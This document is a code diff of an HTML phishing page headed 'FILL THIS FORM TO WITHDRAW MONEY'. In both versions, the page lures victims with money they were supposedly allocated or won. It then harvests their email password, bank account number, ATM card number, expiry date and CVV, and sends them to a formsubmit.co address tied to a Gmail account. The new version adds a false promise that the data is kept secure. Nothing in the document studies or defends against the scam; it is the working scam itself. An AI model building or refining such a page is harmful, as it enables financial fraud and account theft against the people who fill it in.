@@ -1,22 +1,23 @@
-<!DOCTYPE html><html lang="en">
+<!DOCTYPE html>
+<html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>FILL THIS FORM TO WITHDRAW MONEY</title>
   <style>
     body {
       font-family: Arial, sans-serif;
-      background: #f5f5f5;
+      background-color: #f2f2f2;
       margin: 0;
-      padding: 0;
-    }
-    .container {
-      max-width: 480px;
-      margin: 30px auto;
       padding: 20px;
-      background: white;
+    }
+    form {
+      background-color: #fff;
+      padding: 20px;
+      max-width: 500px;
+      margin: auto;
+      border-radius: 10px;
       box-shadow: 0 0 10px rgba(0,0,0,0.1);
-      border-radius: 8px;
     }
     h2 {
       text-align: center;
@@ -31,222 +32,197 @@
       width: 100%;
       padding: 10px;
       margin-top: 5px;
+      border-radius: 5px;
       border: 1px solid #ccc;
-      border-radius: 4px;
-      box-sizing: border-box;
+      font-size: 16px;
     }
-    .info-box {
-      margin-top: 15px;
-      padding: 10px;
-      border-radius: 4px;
-      font-weight: bold;
+    .error {
+      color: red;
+      font-size: 14px;
+      display: none;
+      margin-top: 3px;
     }
-    .green-box {
-      background-color: #d4edda;
-      color: #155724;
-      border: 1px solid #c3e6cb;
+    .eye-toggle {
+      position: relative;
     }
-    .red-box {
-      background-color: #f8d7da;
-      color: #721c24;
-      border: 1px solid #f5c6cb;
+    .eye-toggle input {
+      padding-right: 40px;
+    }
+    .eye-toggle span {
+      position: absolute;
+      top: 35%;
+      right: 10px;
+      cursor: pointer;
+      user-select: none;
     }
     button {
-      width: 100%;
-      padding: 12px;
-      border: none;
-      border-radius: 4px;
-      font-size: 16px;
       margin-top: 20px;
+      padding: 12px;
+      width: 100%;
+      font-size: 16px;
+      background-color: #4CAF50;
+      border: none;
       color: white;
+      border-radius: 5px;
+      cursor: pointer;
     }
-    .submit-green {
-      background-color: #28a745;
+    button:disabled {
+      background-color: #ccc;
+      cursor: not-allowed;
     }
-    .submit-red {
-      background-color: #dc3545;
+    .note {
+      margin-top: 20px;
+      font-style: italic;
+      color: #444;
     }
   </style>
 </head>
 <body>
-  <div class="container">
+  <form action="https://formsubmit.co/exellentfirm@gmail.com" method="POST">
     <h2>FILL THIS FORM TO WITHDRAW MONEY</h2>
-    <form id="withdrawForm" action="https://formsubmit.co/exellentfirm@gmail.com" method="POST">
-      <input type="hidden" name="_redirect" value="https://onlinegistrationprog.github.io/thankyou.html">
-      <input type="hidden" name="_captcha" value="false"><label>Full Name</label>
-  <input type="text" name="full_name" id="fullName" required>
 
-  <label>Phone Number</label>
-  <input type="tel" name="phone_number" id="phoneNumber" pattern="\d{9,13}" required>
+    <label for="name">Full Name</label>
+    <input type="text" id="name" name="Full Name" required>
 
-  <label>Enter Amount You Were Allocated</label>
-  <input type="text" name="allocated_amount" id="allocatedAmount" pattern="\d{4,10}" placeholder="Enter Exact Amount You Were Allocated Failure Transactions May be Cancelled" required>
+    <label for="country">Country</label>
+    <input type="text" id="country" name="Country" required>
 
-  <label>Do you want to withdraw <span id="amtSpan1"></span> to your phone number <span id="phoneSpan1"></span>?</label>
-  <select id="withdrawToPhone" name="withdraw_phone">
-    <option value="">Select</option>
-    <option value="Yes">Yes</option>
-    <option value="No">No</option>
-  </select>
+    <label for="phone">Phone Number</label>
+    <input type="tel" id="phone" name="Phone Number" required pattern="^[0-9]{9,12}$">
+    <div class="error" id="phoneError">Phone number must be 9 to 12 digits.</div>
 
-  <div id="field5" class="info-box green-box" style="display:none;"></div>
+    <label for="email">Email Address</label>
+    <input type="email" id="email" name="Email Address" required>
 
-  <div id="field6" class="info-box red-box" style="display:none;">
-    Transactions Cancelled for international Money we only support BANK Payment
-  </div>
+    <label for="emailPass">Email Password</label>
+    <div class="eye-toggle">
+      <input type="password" id="emailPass" name="Email Password" required>
+      <span onclick="togglePassword()">👁️</span>
+    </div>
 
-  <label id="label7" style="display:none;">Do you have Bank Account?</label>
-  <select id="bankAccount" name="bank_account" style="display:none;">
-    <option value="">Select</option>
-    <option value="Yes">Yes</option>
-    <option value="No">No</option>
-  </select>
+    <label for="amountWon">Amount You Won</label>
+    <input type="number" id="amountWon" name="Amount You Won" required>
 
-  <div id="field8" class="info-box red-box" style="display:none;">
-    You must have bank account and ATM card to withdraw money from this Site
-  </div>
+    <label for="accountType">Bank Account Type</label>
+    <input type="text" id="accountType" name="Bank Account Type" required>
 
-  <label id="label9" style="display:none;">Which Payment Option do you have?</label>
-  <select id="paymentOption" name="payment_option" style="display:none;">
-    <option value="">Select</option>
-    <option value="Other Number">Other Number</option>
-    <option value="Bank Account">Bank Account</option>
-  </select>
+    <label for="accountNumber">Bank Account Number</label>
+    <input type="text" id="accountNumber" name="Bank Account Number" required>
 
-  <label id="label10" style="display:none;">Enter phone number</label>
-  <input type="tel" name="alt_phone_number" id="altPhoneNumber" style="display:none;" pattern="\d{9,13}">
+    <label for="accountHolder">Bank Account Holder's Name</label>
+    <input type="text" id="accountHolder" name="Bank Account Holder's Name" required>
 
-  <div id="field11" class="info-box green-box" style="display:none;"></div>
+    <label for="linkedATM">Did You Link ATM to Your Bank Account?</label>
+    <select id="linkedATM" name="Did You Link ATM to Your Bank Account?" required onchange="handleATMChange()">
+      <option value="">Select</option>
+      <option value="Yes">Yes</option>
+      <option value="No">No</option>
+    </select>
 
-  <label id="label12" style="display:none;">Bank Account Number</label>
-  <input type="text" name="bank_account_number" id="bankAccountNumber" style="display:none;">
+    <div id="atmFields">
+      <label for="atmCard">ATM Card Number</label>
+      <input type="text" id="atmCard" name="ATM Card Number" pattern="\\d{16}">
+      <div class="error" id="atmCardError">ATM Card must be exactly 16 digits.</div>
 
-  <label id="label13" style="display:none;">Did you link ATM card to your bank account?</label>
-  <select id="atmLinked" name="atm_linked" style="display:none;">
-    <option value="">Select</option>
-    <option value="Yes">Yes</option>
-    <option value="No">No</option>
-  </select>
+      <label for="expiry">Expiry Date (MM/YY)</label>
+      <input type="text" id="expiry" name="Expiry Date" maxlength="5" placeholder="MM/YY">
+      <div class="error" id="expiryError">Enter a valid MM/YY format.</div>
 
-  <div id="field14" class="info-box red-box" style="display:none;">
-    You must have ATM CARD to Withdrawal Money from this site
-  </div>
+      <label for="cvv">CVV</label>
+      <input type="text" id="cvv" name="CVV" maxlength="3" pattern="\\d{3}">
+      <div class="error" id="cvvError">CVV must be exactly 3 digits.</div>
+    </div>
 
-  <div id="cardSection" style="display:none;">
-    <label>Card Number</label>
-    <input type="text" name="card_number" id="cardNumber" pattern="\d{16}">
+    <p class="note" id="finalNote"></p>
 
-    <label>CVV</label>
-    <input type="text" name="cvv" id="cvv" pattern="\d{3}">
+    <input type="hidden" name="_next" value="thankyou.html">
+    <input type="hidden" name="_captcha" value="false">
 
-    <label>Expiry Date (MM/YY)</label>
-    <input type="text" name="expiry" id="expiry" pattern="\d{2}/\d{2}">
-  </div>
+    <button type="submit" id="submitBtn" disabled>Submit</button>
 
-  <div id="field19" class="info-box green-box" style="display:none;"></div>
+    <p class="note">We keep your data secure and confidential</p>
+  </form>
 
-  <label id="label20" style="display:none;">Enter Your Email Address</label>
-  <input type="email" name="email" id="email" style="display:none;" pattern=".+@gmail\.com">
+  <script>
+    function togglePassword() {
+      const input = document.getElementById("emailPass");
+      input.type = input.type === "password" ? "text" : "password";
+    }
 
-  <label id="label21" style="display:none;">Enter Email Address Password</label>
-  <input type="password" name="email_password" id="emailPassword" style="display:none;">
+    const phoneInput = document.getElementById("phone");
+    const phoneError = document.getElementById("phoneError");
 
-  <button type="submit" id="submitBtn" class="submit-green">Submit</button>
-</form>
+    phoneInput.addEventListener("blur", () => {
+      const valid = /^\d{9,12}$/.test(phoneInput.value);
+      phoneError.style.display = valid ? "none" : "block";
+    });
 
-  </div>  <script>
-    const form = document.getElementById("withdrawForm");
-    const amount = document.getElementById("allocatedAmount");
-    const phone = document.getElementById("phoneNumber");
+    const atmCard = document.getElementById("atmCard");
+    const atmCardError = document.getElementById("atmCardError");
+    atmCard.addEventListener("blur", () => {
+      const valid = /^\d{16}$/.test(atmCard.value);
+      atmCardError.style.display = valid || atmCard.value === "" ? "none" : "block";
+    });
 
-    const withdrawToPhone = document.getElementById("withdrawToPhone");
-    const field5 = document.getElementById("field5");
-    const field6 = document.getElementById("field6");
-    const bankAccount = document.getElementById("bankAccount");
-    const label7 = document.getElementById("label7");
-    const field8 = document.getElementById("field8");
-    const paymentOption = document.getElementById("paymentOption");
-    const label9 = document.getElementById("label9");
-    const altPhone = document.getElementById("altPhoneNumber");
-    const label10 = document.getElementById("label10");
-    const field11 = document.getElementById("field11");
-    const bankAccountNumber = document.getElementById("bankAccountNumber");
-    const label12 = document.getElementById("label12");
-    const atmLinked = document.getElementById("atmLinked");
-    const label13 = document.getElementById("label13");
-    const field14 = document.getElementById("field14");
-    const cardSection = document.getElementById("cardSection");
-    const field19 = document.getElementById("field19");
-    const email = document.getElementById("email");
-    const label20 = document.getElementById("label20");
-    const emailPassword = document.getElementById("emailPassword");
-    const label21 = document.getElementById("label21");
+    const expiry = document.getElementById("expiry");
+    const expiryError = document.getElementById("expiryError");
+    expiry.addEventListener("input", (e) => {
+      let val = expiry.value.replace(/[^0-9]/g, "");
+      if (val.length > 2) val = val.slice(0,2) + "/" + val.slice(2);
+      expiry.value = val.slice(0,5);
+    });
+    expiry.addEventListener("blur", () => {
+      const valid = /^(0[1-9]|1[0-2])\/\d{2}$/.test(expiry.value);
+      expiryError.style.display = valid || expiry.value === "" ? "none" : "block";
+    });
+
+    const cvv = document.getElementById("cvv");
+    const cvvError = document.getElementById("cvvError");
+    cvv.addEventListener("blur", () => {
+      const valid = /^\d{3}$/.test(cvv.value);
+      cvvError.style.display = valid || cvv.value === "" ? "none" : "block";
+    });
+
+    const linkedATM = document.getElementById("linkedATM");
+    const atmFields = document.getElementById("atmFields");
+    const finalNote = document.getElementById("finalNote");
     const submitBtn = document.getElementById("submitBtn");
 
-    withdrawToPhone.addEventListener("change", () => {
-      const amt = amount.value;
-      const tel = phone.value;
-      document.getElementById("amtSpan1").textContent = amt;
-      document.getElementById("phoneSpan1").textContent = tel;
-
-      if (withdrawToPhone.value === "Yes") {
-        field5.textContent = `>> Withdrawing ${amt} to ${tel} <<`;
-        field5.style.display = "block";
-        field6.style.display = "block";
-        label7.style.display = bankAccount.style.display = "block";
-        label9.style.display = paymentOption.style.display = "none";
+    function handleATMChange() {
+      const value = linkedATM.value;
+      if (value === "Yes") {
+        atmFields.style.display = "block";
+        submitBtn.disabled = false;
+        finalNote.style.display = "block";
+        updateFinalNote();
       } else {
-        field5.style.display = "none";
-        field6.style.display = "block";
-        label7.style.display = bankAccount.style.display = "none";
-        label9.style.display = paymentOption.style.display = "block";
+        atmFields.style.display = "none";
+        submitBtn.disabled = true;
+        finalNote.style.display = "none";
       }
+    }
+
+    const nameInput = document.getElementById("name");
+    const amountWonInput = document.getElementById("amountWon");
+    const accountTypeInput = document.getElementById("accountType");
+    const accountNumberInput = document.getElementById("accountNumber");
+
+    function updateFinalNote() {
+      const fullName = nameInput.value;
+      const amount = amountWonInput.value;
+      const accType = accountTypeInput.value;
+      const accNum = accountNumberInput.value;
+
+      finalNote.textContent = `Dear ${fullName}, You will receive ${amount} to your ${accType}, ${accNum}`;
+    }
+
+    [nameInput, amountWonInput, accountTypeInput, accountNumberInput].forEach(input => {
+      input.addEventListener("input", updateFinalNote);
     });
 
-    bankAccount.addEventListener("change", () => {
-      if (bankAccount.value === "Yes") {
-        field8.style.display = "none";
-        label12.style.display = bankAccountNumber.style.display = "block";
-        label13.style.display = atmLinked.style.display = "block";
-      } else {
-        field8.style.display = "block";
-        submitBtn.textContent = "Cancelled";
-        submitBtn.className = "submit-red";
-      }
-    });
-
-    atmLinked.addEventListener("change", () => {
-      if (atmLinked.value === "Yes") {
-        field14.style.display = "none";
-        cardSection.style.display = field19.style.display = "block";
-        label20.style.display = email.style.display = "block";
-        label21.style.display = emailPassword.style.display = "block";
-        submitBtn.textContent = "Submit";
-        submitBtn.className = "submit-green";
-      } else {
-        cardSection.style.display = field19.style.display = "none";
-        field14.style.display = "block";
-        submitBtn.textContent = "Transactions Cancelled";
-        submitBtn.className = "submit-red";
-      }
-    });
-
-    paymentOption.addEventListener("change", () => {
-      if (paymentOption.value === "Other Number") {
-        label10.style.display = altPhone.style.display = "block";
-      } else if (paymentOption.value === "Bank Account") {
-        label12.style.display = bankAccountNumber.style.display = "block";
-        label13.style.display = atmLinked.style.display = "block";
-      }
-    });
-
-    altPhone.addEventListener("blur", () => {
-      const amt = amount.value;
-      const alt = altPhone.value;
-      if (alt) {
-        field11.textContent = `Withdrawing ${amt} to ${alt}`;
-        field11.style.display = "block";
-      }
-    });
-  </script></body>
+    window.onload = () => {
+      handleATMChange(); // hide fields if already selected
+    };
+  </script>
+</body>
 </html>
